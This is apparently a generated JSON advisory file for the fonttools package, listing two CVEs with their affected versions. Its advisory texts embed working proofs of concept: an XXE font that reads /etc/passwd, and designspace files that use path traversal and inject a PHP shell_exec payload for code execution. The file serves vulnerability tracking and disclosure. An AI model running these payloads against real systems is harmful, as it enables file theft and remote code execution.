@@ -1,0 +1,365 @@
+{
+  "schema_version": 1,
+  "package": "fonttools",
+  "purls": [
+    "pkg:pypi/fonttools"
+  ],
+  "generated_at": "2026-05-18T06:01:40+00:00",
+  "conda_versions_total": 142,
+  "advisories": [
+    {
+      "id": "GHSA-6673-4983-2vx5",
+      "primary_id": "CVE-2023-45139",
+      "aliases": [
+        "CVE-2023-45139"
+      ],
+      "cve_ids": [
+        "CVE-2023-45139"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "fonttools",
+      "summary": "fonttools XML External Entity Injection (XXE) Vulnerability",
+      "details": "### Summary\n\nAs of `fonttools>=4.28.2` the subsetting module has a XML External Entity Injection (XXE) vulnerability which allows an attacker to resolve arbitrary entities when a candidate font (OT-SVG fonts), which contains a SVG table, is parsed. \n\nThis allows attackers to include arbitrary files from the filesystem fontTools is running on or make web requests from the host system. \n\n### PoC\n\n\nThe vulnerability can be reproduced following the bellow steps on a unix based system.\n\n1. Build a OT-SVG font which includes a external entity in the SVG table which resolves a local file. In our testing we utilised `/etc/passwd` for our POC file to include and modified an existing subset integration test to build the POC font - see bellow.\n\n```python\n\nfrom string import ascii_letters\nfrom fontTools.fontBuilder import FontBuilder\nfrom fontTools.pens.ttGlyphPen import TTGlyphPen\nfrom fontTools.ttLib import newTable\n\n\nXXE_SVG = \"\"\"\\\n<?xml version=\"1.0\"?>\n<!DOCTYPE svg [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>\n<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n  <g id=\"glyph1\">\n    <text font-size=\"10\" x=\"0\" y=\"10\">&test;</text>\n  </g>\n</svg>\n\"\"\"\n\ndef main():\n    # generate a random TTF font with an SVG table\n    glyph_order = [\".notdef\"] + list(ascii_letters)\n    pen = TTGlyphPen(glyphSet=None)\n    pen.moveTo((0, 0))\n    pen.lineTo((0, 500))\n    pen.lineTo((500, 500))\n    pen.lineTo((500, 0))\n    pen.closePath()\n    glyph = pen.glyph()\n    glyphs = {g: glyph for g in glyph_order}\n\n    fb = FontBuilder(unitsPerEm=1024, isTTF=True)\n    fb.setupGlyphOrder(glyph_order)\n    fb.setupCharacterMap({ord(c): c for c in ascii_letters})\n    fb.setupGlyf(glyphs)\n    fb.setupHorizontalMetrics({g: (500, 0) for g in glyph_order})\n    fb.setupHorizontalHeader()\n    fb.setupOS2()\n    fb.setupPost()\n    fb.setupNameTable({\"familyName\": \"TestSVG\", \"styleName\": \"Regular\"})\n\n    svg_table = newTable(\"SVG \")\n    svg_table.docList = [\n       (XXE_SVG, 1, 12)\n    ]\n    fb.font[\"SVG \"] = svg_table\n\n    fb.font.save('poc-payload.ttf')\n\nif __name__ == '__main__':\n    main()\n\n```\n\n2. Subset the font with an affected version of fontTools - we tested on `fonttools==4.42.1` and `fonttools==4.28.2` - using the following flags (which just ensure the malicious glyph is mapped by the font and not discard in the subsetting process):\n\n```shell\npyftsubset poc-payload.ttf --output-file=\"poc-payload.subset.ttf\" --unicodes=\"*\" --ignore-missing-glyphs\n```\n\n3. Read the parsed SVG table in the subsetted font:\n\n```shell\nttx -t SVG poc-payload.subset.ttf && cat poc-payload.subset.ttx\n```\n\nObserved the included contents of the `/etc/passwd` file. \n\n### Impact\n\nNote the final severity is dependant on the environment fontTools is running in.\n\n- The vulnerability has the most impact on consumers of fontTools who leverage the subsetting utility to subset untrusted OT-SVG fonts where the vulnerability may be exploited to read arbitrary files from the filesystem of the host fonttools is running on\n\n\n\n### Possible Mitigations \n\nThere may be other ways to mitigate the issue, but some suggestions:\n\n1. Set the `resolve_entities=False` flag on parsing methods\n2. Consider further methods of disallowing doctype declarations\n3. Consider recursive regex matching\n\n",
+      "published": "2024-01-09T16:01:10Z",
+      "modified": "2024-05-02T13:16:16.164514Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/fonttools/fonttools/security/advisories/GHSA-6673-4983-2vx5"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-45139"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/fonttools/fonttools/commit/9f61271dc1ca82ed91f529b130fe5dc5c9bf1f4c"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/fonttools/fonttools"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/fonttools/fonttools/releases/tag/4.43.0"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/VY63B4SGY4QOQGUXMECRGD6K3YT3GJ75"
+        },
+        {
+          "type": "WEB",
+          "url": "http://www.openwall.com/lists/oss-security/2024/03/08/2"
+        },
+        {
+          "type": "WEB",
+          "url": "http://www.openwall.com/lists/oss-security/2024/03/09/1"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-6673-4983-2vx5",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "4.28.2"
+            },
+            {
+              "fixed": "4.43.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "4.28.2",
+        "4.28.3",
+        "4.28.4",
+        "4.28.5",
+        "4.29.0",
+        "4.29.1",
+        "4.30.0",
+        "4.31.0",
+        "4.31.1",
+        "4.31.2",
+        "4.32.0",
+        "4.33.0",
+        "4.33.1",
+        "4.33.2",
+        "4.33.3",
+        "4.34.0",
+        "4.34.1",
+        "4.34.2",
+        "4.34.3",
+        "4.34.4",
+        "4.35.0",
+        "4.36.0",
+        "4.37.0",
+        "4.37.1",
+        "4.37.2",
+        "4.37.3",
+        "4.37.4",
+        "4.38.0",
+        "4.38.1.dev0",
+        "4.39.0",
+        "4.39.1",
+        "4.39.2",
+        "4.39.3",
+        "4.39.4",
+        "4.40.0",
+        "4.41.0",
+        "4.41.1",
+        "4.42.0",
+        "4.42.1"
+      ],
+      "affected_conda_versions": [
+        "4.28.2",
+        "4.28.3",
+        "4.28.4",
+        "4.28.5",
+        "4.29.0",
+        "4.29.1",
+        "4.30.0",
+        "4.31.0",
+        "4.31.1",
+        "4.31.2",
+        "4.32.0",
+        "4.33.0",
+        "4.33.1",
+        "4.33.2",
+        "4.33.3",
+        "4.34.0",
+        "4.34.2",
+        "4.34.3",
+        "4.34.4",
+        "4.35.0",
+        "4.36.0",
+        "4.37.0",
+        "4.37.1",
+        "4.37.2",
+        "4.37.3",
+        "4.37.4",
+        "4.38.0",
+        "4.39.0",
+        "4.39.1",
+        "4.39.2",
+        "4.39.3",
+        "4.39.4",
+        "4.40.0",
+        "4.41.0",
+        "4.41.1",
+        "4.42.0",
+        "4.42.1"
+      ]
+    },
+    {
+      "id": "GHSA-768j-98cg-p3fv",
+      "primary_id": "CVE-2025-66034",
+      "aliases": [
+        "CVE-2025-66034"
+      ],
+      "cve_ids": [
+        "CVE-2025-66034"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "fonttools",
+      "summary": "fontTools is Vulnerable to Arbitrary File Write and XML injection in fontTools.varLib",
+      "details": "## Summary\n\nThe `fonttools varLib` (or `python3 -m fontTools.varLib`) script has an arbitrary file write vulnerability that leads to remote code execution when a malicious .designspace file is processed. The vulnerability affects the `main()` code path of `fontTools.varLib`, used by the fonttools varLib CLI and any code that invokes `fontTools.varLib.main()`.\n\nThe vulnerability exists due to unsanitised filename handling combined with content injection. Attackers can write files to arbitrary filesystem locations via path traversal sequences, and inject malicious code (like PHP) into the output files through XML injection in labelname elements. When these files are placed in web-accessible locations and executed, this achieves remote code execution without requiring any elevated privileges. Once RCE is obtained, attackers can further escalate privileges to compromise system files (like overwriting `/etc/passwd`).\n\nOverall this allows attackers to:\n- Write font files to arbitrary locations on the filesystem\n- Overwrite configuration files\n- Corrupt application files and dependencies\n- Obtain remote code execution\n\nThe attacker controls the file location, extension and contents which could lead to remote code execution as well as enabling a denial of service through file corruption means.\n\n## Affected Lines\n\n`fontTools/varLib/__init__.py`\n```python\nfilename = vf.filename # Unsanitised filename\noutput_path = os.path.join(output_dir, filename) # Path traversal\nvf.save(output_path) # Arbitrary file write\n```\n\n## PoC\n1. Set up `malicious.designspace` and respective `source-*.ttf` files in a directory like `/Users/<username>/testing/demo/` (will impact relative file location within malicious.designspace)\n\n`setup.py`\n```python\n#!/usr/bin/env python3\nimport os\n\nfrom fontTools.fontBuilder import FontBuilder\nfrom fontTools.pens.ttGlyphPen import TTGlyphPen\n\ndef create_source_font(filename, weight=400):\n    fb = FontBuilder(unitsPerEm=1000, isTTF=True)\n    fb.setupGlyphOrder([\".notdef\"])\n    fb.setupCharacterMap({})\n    \n    pen = TTGlyphPen(None)\n    pen.moveTo((0, 0))\n    pen.lineTo((500, 0))\n    pen.lineTo((500, 500))\n    pen.lineTo((0, 500))\n    pen.closePath()\n    \n    fb.setupGlyf({\".notdef\": pen.glyph()})\n    fb.setupHorizontalMetrics({\".notdef\": (500, 0)})\n    fb.setupHorizontalHeader(ascent=800, descent=-200)\n    fb.setupOS2(usWeightClass=weight)\n    fb.setupPost()\n    fb.setupNameTable({\"familyName\": \"Test\", \"styleName\": f\"Weight{weight}\"})\n    fb.save(filename)\n\nif __name__ == '__main__':\n    os.chdir(os.path.dirname(os.path.abspath(__file__)))\n    create_source_font(\"source-light.ttf\", weight=100)\n    create_source_font(\"source-regular.ttf\", weight=400)\n```\n\n`malicious.designspace`\n```xml\n<?xml version='1.0' encoding='UTF-8'?>\n<designspace format=\"5.0\">\n  <axes>\n    <axis tag=\"wght\" name=\"Weight\" minimum=\"100\" maximum=\"900\" default=\"400\"/>\n  </axes>\n  \n  <sources>\n    <source filename=\"source-light.ttf\" name=\"Light\">\n      <location>\n        <dimension name=\"Weight\" xvalue=\"100\"/>\n      </location>\n    </source>\n    <source filename=\"source-regular.ttf\" name=\"Regular\">\n      <location>\n        <dimension name=\"Weight\" xvalue=\"400\"/>\n      </location>\n    </source>\n  </sources>\n  \n  <!-- Filename can be arbitrarily set to any path on the filesystem -->\n  <variable-fonts>\n    <variable-font name=\"MaliciousFont\" filename=\"../../tmp/newarbitraryfile.json\">\n      <axis-subsets>\n        <axis-subset name=\"Weight\"/>\n      </axis-subsets>\n    </variable-font>\n  </variable-fonts>\n</designspace>\n```\n\nOptional: You can put a file with any material within `../../tmp/newarbitraryfile.json` in advance, the contents in the file will be overwritten after running the setup script in the following step.\n\n2. Run the setup.py script to generate `source-*.tff` files required for the malicious.designspace file.\n```bash\npython3 setup.py\n```\n3. Execute the given payload using the vulnerable varLib saving the file into the arbitrary file location of filename\n```bash\nfonttools varLib malicious.designspace\n```\n4. Validate arbitrary file write was performed by looking at path assigned within malicious designspace\n```bash\ncat {{filename_location}}\n```\n5. After validating that we can provide arbitrary write to any location, we can also validate that we can control sections of content as well demonstrated with the below payload.\n\n`malicious2.designspace`\n```xml\n<?xml version='1.0' encoding='UTF-8'?>\n<designspace format=\"5.0\">\n\t<axes>\n        <!-- XML injection occurs in labelname elements with CDATA sections -->\n\t    <axis tag=\"wght\" name=\"Weight\" minimum=\"100\" maximum=\"900\" default=\"400\">\n\t        <labelname xml:lang=\"en\"><![CDATA[<?php echo shell_exec(\"/usr/bin/touch /tmp/MEOW123\");?>]]]]><![CDATA[>]]></labelname>\n\t        <labelname xml:lang=\"fr\">MEOW2</labelname>\n\t    </axis>\n\t</axes>\n\t<axis tag=\"wght\" name=\"Weight\" minimum=\"100\" maximum=\"900\" default=\"400\"/>\n\t<sources>\n\t\t<source filename=\"source-light.ttf\" name=\"Light\">\n\t\t\t<location>\n\t\t\t\t<dimension name=\"Weight\" xvalue=\"100\"/>\n\t\t\t</location>\n\t\t</source>\n\t\t<source filename=\"source-regular.ttf\" name=\"Regular\">\n\t\t\t<location>\n\t\t\t\t<dimension name=\"Weight\" xvalue=\"400\"/>\n\t\t\t</location>\n\t\t</source>\n\t</sources>\n\t<variable-fonts>\n\t\t<variable-font name=\"MyFont\" filename=\"output.ttf\">\n\t\t\t<axis-subsets>\n\t\t\t\t<axis-subset name=\"Weight\"/>\n\t\t\t</axis-subsets>\n\t\t</variable-font>\n\t</variable-fonts>\n\t<instances>\n\t\t<instance name=\"Display Thin\" familyname=\"MyFont\" stylename=\"Thin\">\n\t\t\t<location><dimension name=\"Weight\" xvalue=\"100\"/></location>\n\t\t\t<labelname xml:lang=\"en\">Display Thin</labelname>\n\t\t</instance>\n\t</instances>\n</designspace>\n```\n\n6. When the program is run, we can show we control the contents in the new file\n```bash\nfonttools varLib malicious2.designspace -o file123\n```\nHere being outputted to a localised area ignoring filename presented in variable-font\n\n7. We can look inside file123 to validate user controlled injection\n```bash\ncat file123\n```\nto show `<?php echo shell_exec(\"/usr/bin/touch /tmp/MEOW123\");?>]]>`\n\n8. Executing the file and reading looking at the newly generated file\n```bash\nphp file123\nls -la /tmp/MEOW123\n```\nwe can see that the file was just created showing RCE.\n\n## Recommendations\n\n- Ensure output file paths configured within designspace files are restricted to the local directory or consider further security measures to prevent arbitrary file write/overwrite within any directory on the system",
+      "published": "2025-12-01T19:07:00Z",
+      "modified": "2026-02-04T02:23:36.661418Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:C/C:N/I:H/A:L"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:C/C:N/I:H/A:L"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/fonttools/fonttools/security/advisories/GHSA-768j-98cg-p3fv"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-66034"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/fonttools/fonttools/commit/a696d5ba93270d5954f98e7cab5ddca8a02c1e32"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/fonttools/fonttools"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-768j-98cg-p3fv",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "4.33.0"
+            },
+            {
+              "fixed": "4.60.2"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "4.33.0",
+        "4.33.1",
+        "4.33.2",
+        "4.33.3",
+        "4.34.0",
+        "4.34.1",
+        "4.34.2",
+        "4.34.3",
+        "4.34.4",
+        "4.35.0",
+        "4.36.0",
+        "4.37.0",
+        "4.37.1",
+        "4.37.2",
+        "4.37.3",
+        "4.37.4",
+        "4.38.0",
+        "4.38.1.dev0",
+        "4.39.0",
+        "4.39.1",
+        "4.39.2",
+        "4.39.3",
+        "4.39.4",
+        "4.40.0",
+        "4.41.0",
+        "4.41.1",
+        "4.42.0",
+        "4.42.1",
+        "4.43.0",
+        "4.43.1",
+        "4.44.0",
+        "4.44.1",
+        "4.44.3",
+        "4.45.0",
+        "4.45.1",
+        "4.46.0",
+        "4.47.0",
+        "4.47.2",
+        "4.48.1",
+        "4.49.0",
+        "4.50.0",
+        "4.51.0",
+        "4.52.1",
+        "4.52.3",
+        "4.52.4",
+        "4.53.0",
+        "4.53.1",
+        "4.54.0",
+        "4.54.1",
+        "4.55.0",
+        "4.55.1",
+        "4.55.2",
+        "4.55.3",
+        "4.55.4",
+        "4.55.5",
+        "4.55.6",
+        "4.55.7",
+        "4.55.8",
+        "4.56.0",
+        "4.57.0",
+        "4.58.0",
+        "4.58.1",
+        "4.58.2",
+        "4.58.3",
+        "4.58.4",
+        "4.58.5",
+        "4.59.0",
+        "4.59.1",
+        "4.59.2",
+        "4.60.0",
+        "4.60.1"
+      ],
+      "affected_conda_versions": [
+        "4.33.0",
+        "4.33.1",
+        "4.33.2",
+        "4.33.3",
+        "4.34.0",
+        "4.34.2",
+        "4.34.3",
+        "4.34.4",
+        "4.35.0",
+        "4.36.0",
+        "4.37.0",
+        "4.37.1",
+        "4.37.2",
+        "4.37.3",
+        "4.37.4",
+        "4.38.0",
+        "4.39.0",
+        "4.39.1",
+        "4.39.2",
+        "4.39.3",
+        "4.39.4",
+        "4.40.0",
+        "4.41.0",
+        "4.41.1",
+        "4.42.0",
+        "4.42.1",
+        "4.43.0",
+        "4.43.1",
+        "4.44.0",
+        "4.44.1",
+        "4.44.3",
+        "4.45.0",
+        "4.45.1",
+        "4.46.0",
+        "4.47.0",
+        "4.47.2",
+        "4.48.1",
+        "4.49.0",
+        "4.50.0",
+        "4.51.0",
+        "4.52.1",
+        "4.52.4",
+        "4.53.0",
+        "4.53.1",
+        "4.54.0",
+        "4.54.1",
+        "4.55.0",
+        "4.55.1",
+        "4.55.2",
+        "4.55.3",
+        "4.55.4",
+        "4.55.5",
+        "4.55.6",
+        "4.55.7",
+        "4.55.8",
+        "4.56.0",
+        "4.57.0",
+        "4.58.0",
+        "4.58.1",
+        "4.58.2",
+        "4.58.4",
+        "4.58.5",
+        "4.59.0",
+        "4.59.1",
+        "4.59.2",
+        "4.60.0",
+        "4.60.1"
+      ]
+    }
+  ]
+}
